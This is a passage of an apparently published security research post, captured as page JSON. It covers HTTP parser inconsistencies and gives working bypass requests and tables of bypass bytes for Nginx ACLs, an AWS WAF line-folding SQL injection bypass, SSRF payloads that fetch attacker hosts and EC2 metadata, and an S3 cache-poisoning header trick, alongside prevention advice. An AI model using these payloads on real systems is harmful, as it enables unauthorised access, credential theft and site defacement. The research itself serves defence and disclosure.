href=\\\"https://www.youtube.com/watch?v=dnf6Zi5eNW8\\\"\u003ehttps://www.youtube.com/watch?v=dnf6Zi5eNW8\u003c/a\u003e\u003c/div\u003e\\n\u003cp\u003e \u003c/p\u003e\\n\u003cp\u003eIn addition to Varnish, other cache servers such as Akamai were also vulnerable to this issue. However, it's important to note that this vulnerability has been addressed and cannot be reproduced on any AWS service today.\u003c/p\u003e\\n\u003ch1 id=\\\"heading-conclusion\\\"\u003eConclusion\u003c/h1\u003e\\n\u003cp\u003eIn conclusion, this research delved into the realm of security vulnerabilities in web applications, specifically focusing on HTTP parsers and the implications they can have on overall security. By exploring inconsistencies in HTTP parsers across various technologies, such as load balancers, reverse proxies, web servers, and caching servers, I unveiled potential avenues for exploitation.\u003c/p\u003e\\n\u003cp\u003eI demonstrated how certain behaviors, like path normalization and the acceptance of special characters, can lead to bypassing security rules and even opening the door to Server-Side Request Forgery (SSRF) and Cache Poisoning vulnerabilities.\u003c/p\u003e\\n\u003cp\u003eMoreover, I highlighted the significance of utilizing reverse proxies that effectively validate and sanitize HTTP requests. Implementing a robust reverse proxy can significantly bolster the security posture of a web application by intercepting and filtering malicious requests before they reach the backend servers.\u003c/p\u003e\\n\",\"markdown\":\"The HTTP protocol plays a vital role in the seamless functioning of web applications, however, the implementation of HTTP parsers across different technologies can introduce subtle discrepancies, leading to potential security loopholes.\\n\\nIn this research, my focus revolves around the discovery of inconsistencies within HTTP parsers across various web technologies, including load balancers, reverse proxies, web servers, and caching servers. By investigating these disparities, I aim to shed light on potential new vulnerabilities that involve HTTP Desync attacks.\\n\\nIt was my first security research, I started on this journey in December 2021 and concluded in April 2022. I tried to be creative in finding new attack vectors due to incorrect HTTP parsing. In this post, I will share the final results of this study.\\n\\n# Pathname Manipulation: Bypassing Reverse Proxies and Load Balancers Security Rules\\n\\nThis section of the research focuses on the exploitable vulnerabilities arising from pathname manipulation in web servers, principally about the use of `trim()` or `strip()` functions. By exploiting these techniques, attackers can circumvent security rules specific to certain paths in reverse proxies and load balancers, posing a significant threat to web application security.\\n\\nIn this section, we delve into the intricacies of how web servers process and manipulate pathnames, investigating the impact of the removal of certain characters, which can lead to unintended behaviors.\\n\\n## Nginx ACL Rules\\n\\nNginx is a powerful web server and reverse proxy which allows developers to apply security rules on HTTP requests. This section explores security threads of the capabilities of Nginx in rewriting or blocking HTTP messages, with a primary focus on rules triggered by specific strings or regular expressions found within the HTTP pathname section.\\n\\nIn Nginx, the \\\"location\\\" rule enables developers to define specific directives and behaviors based on the requested URL. This rule acts as a key component in routing and processing incoming HTTP requests, allowing control over how different URLs are handled.\\n\\n```plaintext\\nlocation = /admin {\\n    deny all;\\n}\\n\\nlocation = /admin/ {\\n    deny all;\\n}\\n```\\n\\nThe above Nginx rule aims to deny every access to the `/admin` endpoint, so if a user tries to access this endpoint, Nginx will return `403` and will not pass the HTTP message to the web server.\\n\\nTo prevent security issues on URI-based rules, Nginx performs path normalization before checking them. Path normalization in Nginx refers to the process of transforming and standardizing requested URLs to a consistent and canonical format before handling them. It involves removing redundant or unnecessary elements from the URL path, such as extra slashes, dot segments, processing path traversal, and URL-encoded characters, to ensure uniformity and proper routing within the web server.\\n\\n## Trim Inconsistencies\\n\\nBefore we proceed, we need to understand what the `trim()` function does in different languages.\\n\\nDifferent languages remove different characters when the correspondent function for `trim()` is called. Each server will normalize the pathname based on its `trim()`, removing different characters. But Nginx which is written in C, does not cover all characters for all languages.\\n\\nE.g.: Python removes the character `\\\\x85` with `strip()`, and JavaScript does not with `trim()`.\\n\\n![](https://cdn.hashnode.com/res/hashnode/image/upload/v1686750781066/bf6a391a-2bf5-4605-9e5e-8cc0f059a995.png align=\\\"center\\\")\\n\\n![](https://cdn.hashnode.com/res/hashnode/image/upload/v1686750895455/784cf8a4-b070-4bb6-abd0-12ae887d568c.png align=\\\"center\\\")\\n\\nIf an HTTP message is parsed using the `trim()` function in different languages, an HTTP Desync attack can occur.\\n\\n## Bypassing Nginx ACL Rules With Node.js\\n\\nLet's consider the following Nginx ACL rule and Node.js API source code using Express:\\n\\n```plaintext\\nlocation = /admin {\\n    deny all;\\n}\\n\\nlocation = /admin/ {\\n    deny all;\\n}\\n```\\n\\n```javascript\\napp.get('/admin', (req, res) =\u003e {\\n    return res.send('ADMIN');\\n});\\n```\\n\\nFollowing the `trim()` logic, Node.js \\\"ignores\\\" the characters `\\\\x09`, `\\\\xa0`, and `\\\\x0c` from the pathname, but Nginx considers them as part of the URL:\\n\\n![](https://cdn.hashnode.com/res/hashnode/image/upload/v1686751453300/0531fc1a-9599-4a00-aa94-21cca2db557c.png align=\\\"center\\\")\\n\\n* First, Nginx receives the HTTP request and performs path normalization on the pathname;\\n    \\n* As Nginx includes the character `\\\\xa0` as part of the pathname, the ACL rule for the `/admin` URI will not be triggered. Consequently, Nginx will forward the HTTP message to the backend;\\n    \\n* When the URI `/admin\\\\x0a` is received by the Node.js server, the character `\\\\xa0` will be removed, allowing successful retrieval of the `/admin` endpoint.\\n    \\n\\nBelow is a graphical demonstration of what happens with the HTTP request:\\n\\n![](https://cdn.hashnode.com/res/hashnode/image/upload/v1686752151660/84ec1c49-2df9-4a44-ab01-1d798ef0564f.png align=\\\"center\\\")\\n\\nTo gain a clearer understanding of how this vulnerability can be exploited, I recommend watching the accompanying proof of concept video below:\\n\\n%[https://www.youtube.com/watch?v=sgs3s5oTfz8] \\n\\nBelow is a table correlating Nginx versions with characters that can potentially lead to bypassing URI ACL rules when using Node.js as the backend:\\n\\n| Nginx Version | **Node.js Bypass Characters** |\\n| --- | --- |\\n| 1.22.0 | `\\\\xA0` |\\n| 1.21.6 | `\\\\xA0` |\\n| 1.20.2 | `\\\\xA0`, `\\\\x09`, `\\\\x0C` |\\n| 1.18.0 | `\\\\xA0`, `\\\\x09`, `\\\\x0C` |\\n| 1.16.1 | `\\\\xA0`, `\\\\x09`, `\\\\x0C` |\\n\\n## Bypassing Nginx ACL Rules With Flask\\n\\nFlask removes the characters `\\\\x85`, `\\\\xA0`, `\\\\x1F`, `\\\\x1E`, `\\\\x1D`, `\\\\x1C`, `\\\\x0C`, `\\\\x0B`, and `\\\\x09` from the URL path, but NGINX doesn't.\\n\\nTake the following nginx configuration/API source code as a reference:\\n\\n```plaintext\\nlocation = /admin {\\n    deny all;\\n}\\n\\nlocation = /admin/ {\\n    deny all;\\n}\\n```\\n\\n```python\\n@app.route('/admin', methods = ['GET'])\\ndef admin():\\n    data = {\\\"url\\\":request.url, \\\"admin\\\":\\\"True\\\"}\\n\\n    return Response(str(data), mimetype=\\\"application/json\\\")\\n```\\n\\nAs you can see below, it's possible to circumvent the ACL protection by adding the character `\\\\x85` at the end of the pathname:\\n\\n![](https://cdn.hashnode.com/res/hashnode/image/upload/v1686753386536/4032be9b-c7f3-48ae-8074-5d9ad1f9e7a5.png align=\\\"center\\\")\\n\\n| Nginx Version | **Flask Bypass Characters** |\\n| --- | --- |\\n| 1.22.0 | `\\\\x85`, `\\\\xA0` |\\n| 1.21.6 | `\\\\x85`, `\\\\xA0` |\\n| 1.20.2 | `\\\\x85`, `\\\\xA0`, `\\\\x1F`, `\\\\x1E`, `\\\\x1D`, `\\\\x1C`, `\\\\x0C`, `\\\\x0B` |\\n| 1.18.0 | `\\\\x85`, `\\\\xA0`, `\\\\x1F`, `\\\\x1E`, `\\\\x1D`, `\\\\x1C`, `\\\\x0C`, `\\\\x0B` |\\n| 1.16.1 | `\\\\x85`, `\\\\xA0`, `\\\\x1F`, `\\\\x1E`, `\\\\x1D`, `\\\\x1C`, `\\\\x0C`, `\\\\x0B` |\\n\\n## Bypassing Nginx ACL Rules With Spring Boot\\n\\nSpring removes the characters `\\\\x09` and `\\\\x3B` from the URL path, but Nginx doesn't.\\n\\nTake the following Nginx configuration/API source code as a reference:\\n\\n```plaintext\\nlocation = /admin {\\n    deny all;\\n}\\n\\nlocation = /admin/ {\\n    deny all;\\n}\\n```\\n\\n```java\\n@GetMapping(\\\"/admin\\\")\\npublic String admin() {\\n    return \\\"Greetings from Spring Boot!\\\";\\n}\\n```\\n\\nBelow, you will find a demonstration of how ACL protection can be circumvented by adding the character `\\\\x09` or `\\\\t` at the end of the pathname:\\n\\n![](https://cdn.hashnode.com/res/hashnode/image/upload/v1686753921718/b3f91ea3-558f-4889-860c-15cdc02cb7f6.png align=\\\"center\\\")\\n\\n| Nginx Version | **Spring Boot Bypass Characters** |\\n| --- | --- |\\n| 1.22.0 | `;` |\\n| 1.21.6 | `;` |\\n| 1.20.2 | `\\\\x09`, `;` |\\n| 1.18.0 | `\\\\x09`, `;` |\\n| 1.16.1 | `\\\\x09`, `;` |\\n\\n## Bypassing Nginx ACL Rules With PHP-FPM Integration\\n\\nPHP-FPM (FastCGI Process Manager) is a robust and high-performance PHP FastCGI implementation that works seamlessly with Nginx. It serves as a standalone server for handling PHP requests, improving the speed and efficiency of PHP execution. Nginx acts as a reverse proxy, receiving incoming HTTP requests and passing them to PHP-FPM for processing.\\n\\nLet's consider the following Nginx FPM configuration:\\n\\n```plaintext\\nlocation = /admin.php {\\n    deny all;\\n}\\n\\nlocation ~ \\\\.php$ {\\n    include snippets/fastcgi-php.conf;\\n    fastcgi_pass unix:/run/php/php8.1-fpm.sock;\\n}\\n```\\n\\nWhen two `.php` files are in the same pathname of the HTTP request, PHP will match the first one, ignoring everything after the slash. Since the Nginx is configured to block requests to the specific endpoint `/admin.php`, it's possible to access the admin.php file by doing the following request:\\n\\n![](https://cdn.hashnode.com/res/hashnode/image/upload/v1686758750001/66ac562a-7da9-4397-a76a-1d641474e000.png align=\\\"center\\\")\\n\\nBelow is a graphical example of how the applications interpret the HTTP request:\\n\\n![](https://cdn.hashnode.com/res/hashnode/image/upload/v1686758967146/03073365-9dbf-4cf5-8762-1d705c9a038c.png align=\\\"center\\\")\\n\\nThis technique only works if the second PHP file, in this case, `index.php`, exists in the server structure. Take the following server code/structure as a reference:\\n\\n![](https://cdn.hashnode.com/res/hashnode/image/upload/v1686758832956/d0708099-48e0-46d0-b646-8bb92c51454a.png align=\\\"center\\\")\\n\\nThese behaviors were reported to the Nginx security team in 2022, and they responded by saying that they don't have responsibility for it.\\n\\nSince the research concluded in April 2022, newer versions of Nginx were not specifically tested. However, it is highly likely that the findings and vulnerabilities identified in the research are reproducible in the latest version of Nginx as well.\\n\\n## How to prevent\\n\\nTo prevent these issues, you must use the `~` expression Instead of the `=` expression on Nginx ACL rules, for example:\\n\\n```plaintext\\nlocation ~* ^/admin {\\n    deny all;\\n}\\n```\\n\\nThe `~` expression matches the string `/admin` in any part of the pathname, in other words, if a user sent a request to `/admin1337`, the request will also be blocked.\\n\\n# Bypassing AWS WAF ACL\\n\\n## How AWS WAF ACLs Work\\n\\nAWS ACL (Access Control List) rules are a component of load balancers, providing control over incoming and outgoing network traffic. These rules define access permissions based on specified conditions, allowing or denying requests to and from the load balancer.\\n\\nYou can configure the AWS Web Application Firewall (WAF) ACL to examine and validate HTTP headers. AWS WAF ACL rules allow you to define conditions based on specific header attributes or values, enabling you to control and filter incoming requests.\\n\\nHeader ACL example:\\n\\n![](https://cdn.hashnode.com/res/hashnode/image/upload/v1686762641000/8f9c4e41-c17a-48d6-b2f5-72d76217e337.png align=\\\"center\\\")\\n\\nIn the above example, if a request contains a SQL Injection payload in the `X-Query` header, AWS WAF recognizes the SQL Injection attempt and responds with a `403 Forbidden` HTTP status code. This prevents the request from being forwarded to the backend, effectively blocking any potential exploitation of the application's database through SQL Injection attacks.\\n\\n![](https://cdn.hashnode.com/res/hashnode/image/upload/v1686763561032/d592bd74-2618-461d-9768-314549b691cf.png align=\\\"center\\\")\\n\\nAs you can see, the above request carried the payload `' or '1'='1' --` at the `X-Query` header, and then was blocked by the AWS WAF.\\n\\n## Bypassing AWS WAF ACL With Line Folding\\n\\nWeb servers like Node.js, Flask and many others sometimes encounter a phenomenon known as \\\"line folding.\\\" Line folding refers to the practice of splitting long header values using the characters \\\\\\\\x09 (tab) and \\\\\\\\x20 (space) into multiple lines for readability. However, this behavior can lead to compatibility issues and potential security vulnerabilities.\\n\\nFor example, the header `1337: Value\\\\r\\\\n\\\\t1337` in the following request will be interpreted as `1337: Value\\\\t1337` in the Node.js server:\\n\\n```http\\nGET / HTTP/1.1\\nHost: target.com\\n1337: Value\\n    1337\\nConnection: close\\n```\\n\\nKnowing it, I discovered that it's possible to bypass the AWS WAF by using line folding behavior.\\n\\nUsing the same AWS WAF that protects the `X-Query` from SQL Injection payloads, the following HTTP request was used to confirm that the Node.js server received the payload `' or '1'='1' --` in the `X-Query` header.\\n\\nBelow is a graphical example of how the applications interpret the HTTP request header with line folding:\\n\\n![](https://cdn.hashnode.com/res/hashnode/image/upload/v1686765599948/440f51b0-18bb-451c-92da-3428000cd7f0.png align=\\\"center\\\")\\n\\nFor the exploitation scenario, let's take the following Node.js source code as a reference. It will return the requested headers as a Json:\\n\\n```javascript\\napp.get('/*', (req, res) =\u003e {\\n    res.send(req.headers);\\n});\\n```\\n\\nBelow is an example of an exploitation request:\\n\\n```http\\nGET / HTTP/1.1\\\\r\\\\n\\nHost: target.com\\\\r\\\\n\\nX-Query: Value\\\\r\\\\n\\n\\\\t' or '1'='1' -- \\\\r\\\\n\\nConnection: close\\\\r\\\\n\\n\\\\r\\\\n\\n```\\n\\n![](https://cdn.hashnode.com/res/hashnode/image/upload/v1686765362775/dbd69c56-503e-45bb-ada6-358d3d987ede.png align=\\\"center\\\")\\n\\nIn the provided screenshot, it is evident that the Node.js application interpreted the characters `' or '1'='1' --` as the value for the `X-Query` header. However, the AWS WAF treated it as a header name instead.\\n\\nThis bypass technique was reported to the AWS security team and fixed in 2022.\\n\\n# Incorrect Path Parsing Leads to Server-Side Request Forgery\\n\\nIn the previous sections, I provided reasons to be cautious about trusting reverse proxies. However, in this section, I will demonstrate why utilizing a reverse proxy can be advantageous...\\n\\nIn this section, I will leverage an incorrect pathname interpretation to exploit a Server-Side Request Forgery vulnerability in popular servers and frameworks such as Spring Boot, Flask, and PHP.\\n\\nNormally, a valid HTTP pathname starts with `/` or `http(s)://domain/`, but the majority of the popular WEB servers do not verify it correctly, which can lead to a security risk.\\n\\n## SSRF on Flask Through Incorrect Pathname Interpretation\\n\\nFlask is a lightweight web framework for Python, and it offers a straightforward and flexible approach to web development.\\n\\nAfter conducting tests on Flask's pathname parsing, I discovered that it accepts certain characters that it shouldn't. As an example, the following HTTP request, which should be considered invalid, is surprisingly treated as valid by the framework, but the server responds `404 Not Found`:\\n\\n```http\\nGET @/ HTTP/1.1\\nHost: target.com\\nConnection: close\\n```\\n\\nWhile investigating how this behavior can potentially result in a security vulnerability, I came across a helpful [Medium blog post](https://medium.com/@zwork101/making-a-flask-proxy-server-online-in-10-lines-of-code-44b8721bca6) that demonstrates the creation of a proxy using the Flask framework. Below is an example of the code provided in the blog post:\\n\\n```python\\nfrom flask import Flask\\nfrom requests import get\\n\\napp = Flask('__main__')\\nSITE_NAME = 'https://google.com/'\\n\\n@app.route('/', defaults={'path': ''})\\n@app.route('/\u003cpath:path\u003e')\\ndef proxy(path):\\n  return get(f'{SITE_NAME}{path}').content\\n\\napp.run(host='0.0.0.0', port=8080)\\n```\\n\\nMy first thought was: \\\"*What if the developer forgets to add the last slash in the* `SITE_NAME` *variable?*\\\". And yes, it can lead to an SSRF.\\n\\nSince Flask also allows any ASCII character after the `@`, it's possible to fetch an arbitrary domain after concatenating the malicious pathname and the destination server.\\n\\nPlease consider the following source code as a reference for the exploitation scenario:\\n\\n```python\\nfrom flask import Flask\\nfrom requests import get\\n\\napp = Flask('__main__')\\nSITE_NAME = 'https://google.com'\\n\\n@app.route('/', defaults={'path': ''})\\n@app.route('/\u003cpath:path\u003e')\\n\\ndef proxy(path):\\n  return get(f'{SITE_NAME}{path}').content\\n\\nif __name__ == \\\"__main__\\\":\\n    app.run(threaded=False)\\n```\\n\\nPresented below is an example of an exploitation request:\\n\\n```http\\nGET @evildomain.com/ HTTP/1.1\\nHost: target.com\\nConnection: close\\n```\\n\\nIn the following example, I was able to fetch my EC2 metadata:\\n\\n![](https://cdn.hashnode.com/res/hashnode/image/upload/v1686771183056/fe166abf-b2cb-41be-846b-11ac56b33d71.png align=\\\"center\\\")\\n\\n## SSRF on Spring Boot Through Incorrect Pathname Interpretation\\n\\nUpon discovering the presence of an SSRF vulnerability in Flask, I delved into exploring how this behavior could be exploited in other frameworks. As my research progressed, it became apparent that Spring Boot is also susceptible to this particular issue.\\n\\nAuthentication bypasses, ACL bypasses, and path traversal are known vectors when the application parses Matrix parameters. Servlet matrix parameters are a feature introduced in the Servlet specification that allows you to extract and handle additional data present in the URL path. Unlike query parameters that are separated by the `?` character, matrix parameters are separated by the `;` character within the URL.\\n\\nDuring the research, I discovered that the Spring framework accepts the matrix parameter separator character `;` before the first slash of the HTTP pathname:\\n\\n```http\\nGET ;1337/api/v1/me HTTP/1.1\\nHost: target.com\\nConnection: close\\n```\\n\\nIf a developer implements a server-side request that utilizes the complete pathname of the request to fetch an endpoint, it can lead to the emergence of Server-Side Request Forgery (SSRF).\\n\\nPlease consider the following source code as a reference for the exploitation scenario:\\n\\n![](https://cdn.hashnode.com/res/hashnode/image/upload/v1686772007869/5661fff8-9e48-4c63-b78b-cb69ee0582c0.png align=\\\"center\\\")\\n\\nThe code snippet above utilizes the `HttpServletRequest` API to retrieve the requested URL through the `getRequestURI()` function. Subsequently, it concatenates the requested URI with the destination endpoint http://ifconfig.me.\\n\\nConsidering that Spring permits any character following the Matrix parameter separator, becoming possible to use the `@` character to fetch an arbitrary endpoint as well.\\n\\nBelow is an example of the exploit request:\\n\\n```http\\nGET ;@evil.com/url HTTP/1.1\\nHost: target.com\\nConnection: close\\n```\\n\\n![](https://cdn.hashnode.com/res/hashnode/image/upload/v1686772361453/e66a9edf-a590-4d82-b75a-180c33ae1a21.png align=\\\"center\\\")\\n\\n## PHP Built-in Web Server Case Study - SSRF Through Incorrect Pathname Interpretation\\n\\nThe PHP Built-in web server suffers from the same vulnerability. Still, the Built-in server is not used in production involvements, so I decided to present this behavior as a case study that is unlikely to happen in real-world applications.\\n\\nSurprisingly, PHP allows the asterisk `*` character before the first slash in the pathname, and between the asterisk and the first slash, almost all ASCII characters are accepted as valid HTTP request.\\n\\nHowever, there are two limitations that arise with PHP:\\n\\n1. This technique can only be used for the root pathname `/` and cannot be applied to other endpoints, in other words, the vulnerable code must be in the `index.php` file;\\n    \\n2. Dots `.` are not allowed before the first slash, which restricts the inclusion of arbitrary IPs and domains, to circumvent it, the payload must include a dotless-hex encoded IP address of the malicious domain.\\n    \\n\\nLet's consider the following PHP code for this exploitation scenario:\\n\\n```php\\n\u003c?php\\n$site = \\\"http://ifconfig.me\\\";\\n$current_uri = $_SERVER['REQUEST_URI'];\\n\\n$proxy_site = $site.$current_uri;\\nvar_dump($proxy_site);\\n\\necho \\\"\\\\n\\\\n\\\";\\n\\n$response = file_get_contents($proxy_site);\\nvar_dump($response);\\n?\u003e\\n```\\n\\nThe provided code retrieves the HTTP request pathname using `$_SERVER['REQUEST_URI']` and concatenates it with the destination domain.\\n\\nFor performing IP address dotless-hex encoding, you can utilize the tool [ip-encoder.py](https://gist.github.com/mhmdiaa/2587e2330b87db99c81ace2a190e235f).\\n\\nThe resulting payload used for exploiting which fetches the EC2 metadata is as follows:\\n\\n```http\\nGET *@0xa9fea9fe/ HTTP/1.1\\nHost: target.com\\nConnection: close\\n```\\n\\nIn the following proof of concept, I successfully retrieved my EC2 metadata:\\n\\n![](https://cdn.hashnode.com/res/hashnode/image/upload/v1686789542807/4ca585ed-37e3-4384-bec0-ba2c6e59e75a.png align=\\\"center\\\")\\n\\n## How to prevent\\n\\n* It is essential to consistently employ complete URL domains when concatenating them with user input. For instance, ensure that a trailing slash is added after the domain name, such as `http://ifconfig.me/`.\\n    \\n* Utilizing a reverse proxy that effectively handles HTTP requests. The vulnerabilities mentioned are typically only possible if the framework is used without any additional reverse proxy that verifies the HTTP pathname. In other words, incorporating a reverse proxy can significantly enhance the security of the web application.\\n    \\n\\n# HTTP Desync Cache Poisoning Attacks\\n\\nInconsistencies exist among servers and reverse proxies when it comes to removing invalid invisible characters from header names before interpreting them. This inconsistency can lead to notable vulnerabilities, such as HTTP Request Smuggling. But in this section, I will discuss a vulnerability and technique that I discovered during my research that combines Desync attacks with Cache Poisoning, which affects cache servers when integrated with AWS S3 buckets.\\n\\nBut before we continue, we must understand some functionalities of cache servers.\\n\\n## Cache Keys\\n\\nCache keys are unique identifiers used by cache servers to store and retrieve cached data, they serve as references or labels that allow access to cached content.\\n\\nThe most frequently used cache key is typically derived from the URL's pathname. When a user sends a request to a server that utilizes caching, the cache server employs the requested URL to locate the corresponding cached response to serve back to the user.\\n\\n![](https://cdn.hashnode.com/res/hashnode/image/upload/v1686943618847/430c595b-b7ca-4dec-b31c-58374b1d0a30.webp align=\\\"center\\\")\\n\\nIn addition to the URL's pathname, another default cache key is the Host header. Let's consider a scenario where a cached JavaScript file is located at `https://target.com/static/main.js`. When a user sends an HTTP request to this cached URL, the cache server will return the stored response without having to forward the request to the backend server.\\n\\nHowever, if a user sends an HTTP request to the same endpoint but modifies the Host header to `1337.target.com`, the cache server will attempt to retrieve the backend of the corresponding response for the `/static/main.js` URL using the `1337.target.com` host header. Subsequently, it will generate a stored response specifically for that particular HTTP message.\\n\\n## S3 HTTP Desync Cache Poisoning Issue\\n\\nIn this section, I will demonstrate an HTTP Desync vulnerability that can result in Cache Poisoning, impacting principally AWS S3 buckets.\\n\\nIn the Amazon AWS S3 buckets, the Host header plays a crucial role in routing requests to the correct bucket and enabling proper access to the stored content. When interacting with an S3 bucket, the Host header helps direct requests to the appropriate endpoint within the AWS infrastructure.\\n\\nWhen a request is made to an S3 bucket, the AWS infrastructure inspects the Host header to determine the target bucket. So if a user sends an HTTP request to the domain `your.s3.amazonaws.com` but changes the host header to `my.s3.amazonaws.com`, internally, AWS will \\\"ignore\\\" the domain name, fetching the bucket specified in the host header only. This is a common practice on Cloud services.\\n\\n### The Vulnerability\\n\\nThe interpretation of host headers for S3 buckets involves two key aspects:\\n\\n1. When multiple host headers are included in the request, only the first one will be taken, and any additional headers will be ignored.\\n    \\n2. The following bytes are ignored if present in the header name: `\\\\x1f`, `\\\\x1d`, `\\\\x0c`, `\\\\x1e`, `\\\\x1c`, `\\\\x0b`;\\n    \\n\\nThe vulnerability arises from an inconsistency in the host header interpretation. If the cache server mistakenly includes the ignored bytes as part of the header name, treating it as an invalid host header, while S3 interprets it as a valid host header, it becomes possible to cache arbitrary bucket responses on vulnerable websites.\\n\\nThis behavior allows caching arbitrary S3 bucket content in vulnerable websites.\\n\\nConsider the following exploitation request:\\n\\n![](https://cdn.hashnode.com/res/hashnode/image/upload/v1686958907855/ffd360e3-5eb8-4ffd-939d-b46614f9f430.png align=\\\"center\\\")\\n\\n```http\\nGET / HTTP/1.1\\n[\\\\x1d]Host: evilbucket.com\\nHost: example.bucket.com\\nConnection: close\\n```\\n\\n* First, the cache server examines the header `\\\\x1dHost: evilbucket.com` and treats it like any other unkeyed header;\\n    \\n* Subsequently, the cache server will correctly interpret the `example.bucket.com` header as a valid host header, resulting in the final cache response being associated with this host value.\\n    \\n* Upon reaching the S3 bucket, the header `\\\\x1dHost: evilbucket.com` will be mistakenly interpreted as a valid host header, while the intended `Host: example.bucket.com` header will be ignored. This misinterpretation by AWS will lead to the fetching of the malicious header's associated bucket.\\n    \\n\\nThe final result is a complete cache poisoning of the page with arbitrary content.\\n\\nThe proof of concept video demonstrates the exploitation of this vulnerability in an outdated Varnish cache server. It is important to note that newer versions of Varnish are not susceptible to this vulnerability:\\n\\n%[https://www.youtube.com/watch?v=dnf6Zi5eNW8] \\n\\nIn addition to Varnish, other cache servers such as Akamai were also vulnerable to this issue. However, it's important to note that this vulnerability has been addressed and cannot be reproduced on any AWS service today.\\n\\n# Conclusion\\n\\nIn conclusion, this research delved into the realm of security vulnerabilities in web applications, specifically focusing on HTTP parsers and the implications they can have on overall security. By exploring inconsistencies in HTTP parsers across various technologies, such as load balancers, reverse proxies, web servers, and caching servers, I unveiled potential avenues for exploitation.\\n\\nI demonstrated how certain behaviors, like path normalization and the acceptance of special characters, can lead to bypassing security rules and even opening the door to Server-Side Request Forgery (SSRF) and Cache Poisoning vulnerabilities.\\n\\nMoreover, I highlighted the significance of utilizing reverse proxies that effectively validate and sanitize HTTP requests. Implementing a robust reverse proxy can significantly bolster the security posture of a web application by intercepting and filtering malicious requests before they reach the backend servers.\"},\"views\":19538,\"preferences\":{\"pinnedToBlog\":false,\"disableComments\":false,\"stickCoverToBottom\":true,\"isDelisted\":false},\"readTimeInMinutes\":17,\"series\":null,\"tags\":[{\"id\":\"56744721958ef13879b94c04\",\"slug\":\"http\",\"name\":\"http\"},{\"id\":\"5f2e70c0b8ac395b1f23a6cb\",\"slug\":\"cybersecurity-1\",\"name\":\"#cybersecurity\"},{\"id\":\"56744723958ef13879b952cb\",\"slug\":\"research\",\"name\":\"research\"},{\"id\":\"56744722958ef13879b94f40\",\"slug\":\"web\",\"name\":\"web\"},{\"id\":\"6491b91ec167b41645fd218f\",\"slug\":\"desync-attacks\",\"name\":\"Desync Attacks\"}],\"ogMetaData\":{\"image\":\"https://cdn.hashnode.com/res/hashnode/image/upload/v1687022613860/91867fcc-2a19-4dfb-8fd5-5758b016ad37.avif\"},\"canonicalUrl\":null,\"hasLatexInPost\":false,\"audioUrls\":null,\"isFollowed\":null,\"bookmarked\":false,\"features\":{\"tableOfContents\":{\"isEnabled\":true,\"items\":[{\"__typename\":\"TableOfContentsItem\",\"id\":\"d050ee56-187a-4a8e-9fa6-a99d575bb874\",\"level\":1,\"slug\":\"pathname-manipulation-bypassing-reverse-proxies-and-load-balancers-security-rules\",\"title\":\"Pathname Manipulation: Bypassing Reverse Proxies and Load Balancers Security Rules\",\"parentId\":null},{\"__typename\":\"TableOfContentsItem\",\"id\":\"fa166e5c-0b0e-4957-8eb7-88f7c58f4415\",\"level\":2,\"slug\":\"nginx-acl-rules\",\"title\":\"Nginx ACL Rules\",\"parentId\":\"d050ee56-187a-4a8e-9fa6-a99d575bb874\"},{\"__typename\":\"TableOfContentsItem\",\"id\":\"f5554760-21fd-4080-9078-0e9a31adb2c5\",\"level\":2,\"slug\":\"trim-inconsistencies\",\"title\":\"Trim Inconsistencies\",\"parentId\":\"d050ee56-187a-4a8e-9fa6-a99d575bb874\"},{\"__typename\":\"TableOfContentsItem\",\"id\":\"04aa7506-34d7-4291-9c36-6f0429fef520\",\"level\":2,\"slug\":\"bypassing-nginx-acl-rules-with-nodejs\",\"title\":\"Bypassing Nginx ACL Rules With Node.js\",\"parentId\":\"d050ee56-187a-4a8e-9fa6-a99d575bb874\"},{\"__typename\":\"TableOfContentsItem\",\"id\":\"1d9a1daa-f753-4b31-9452-fb3bccc334c5\",\"level\":2,\"slug\":\"bypassing-nginx-acl-rules-with-flask\",\"title\":\"Bypassing Nginx ACL Rules With Flask\",\"parentId\":\"d050ee56-187a-4a8e-9fa6-a99d575bb874\"},{\"__typename\":\"TableOfContentsItem\",\"id\":\"bf06e637-fa3c-4b02-bbd0-535e8862ed60\",\"level\":2,\"slug\":\"bypassing-nginx-acl-rules-with-spring-boot\",\"title\":\"Bypassing Nginx ACL Rules With Spring Boot\",\"parentId\":\"d050ee56-187a-4a8e-9fa6-a99d575bb874\"},{\"__typename\":\"TableOfContentsItem\",\"id\":\"8d8306a9-c4fa-4c45-92fa-aebb2e886f80\",\"level\":2,\"slug\":\"bypassing-nginx-acl-rules-with-php-fpm-integration\",\"title\":\"Bypassing Nginx ACL Rules With PHP-FPM Integration\",\"parentId\":\"d050ee56-187a-4a8e-9fa6-a99d575bb874\"},{\"__typename\":\"TableOfContentsItem\",\"id\":\"80d340c5-2edf-4d76-a751-cb85c81df78c\",\"level\":2,\"slug\":\"how-to-prevent\",\"title\":\"How to prevent\",\"parentId\":\"d050ee56-187a-4a8e-9fa6-a99d575bb874\"},{\"__typename\":\"TableOfContentsItem\",\"id\":\"6493de19-d626-479e-8986-84670b6f85ae\",\"level\":1,\"slug\":\"bypassing-aws-waf-acl\",\"title\":\"Bypassing AWS WAF ACL\",\"parentId\":null},{\"__typename\":\"TableOfContentsItem\",\"id\":\"df30fef9-02f8-47db-9cbe-1e49a3f36343\",\"level\":2,\"slug\":\"how-aws-waf-acls-work\",\"title\":\"How AWS WAF ACLs Work\",\"parentId\":\"6493de19-d626-479e-8986-84670b6f85ae\"},{\"__typename\":\"TableOfContentsItem\",\"id\":\"70a52fc0-b644-4cc4-a712-6eb7ad60fc7f\",\"level\":2,\"slug\":\"bypassing-aws-waf-acl-with-line-folding\",\"title\":\"Bypassing AWS WAF ACL With Line Folding\",\"parentId\":\"6493de19-d626-479e-8986-84670b6f85ae\"},{\"__typename\":\"TableOfContentsItem\",\"id\":\"268678d3-485e-49a1-89c3-048811a313e2\",\"level\":1,\"slug\":\"incorrect-path-parsing-leads-to-server-side-request-forgery\",\"title\":\"Incorrect Path Parsing Leads to Server-Side Request Forgery\",\"parentId\":null},{\"__typename\":\"TableOfContentsItem\",\"id\":\"1bcc7d29-1379-4cc8-8883-14c1c107dea2\",\"level\":2,\"slug\":\"ssrf-on-flask-through-incorrect-pathname-interpretation\",\"title\":\"SSRF on Flask Through Incorrect Pathname Interpretation\",\"parentId\":\"268678d3-485e-49a1-89c3-048811a313e2\"},{\"__typename\":\"TableOfContentsItem\",\"id\":\"7b140771-f25b-4aab-94ee-5bd0cff5a2ae\",\"level\":2,\"slug\":\"ssrf-on-spring-boot-through-incorrect-pathname-interpretation\",\"title\":\"SSRF on Spring Boot Through Incorrect Pathname 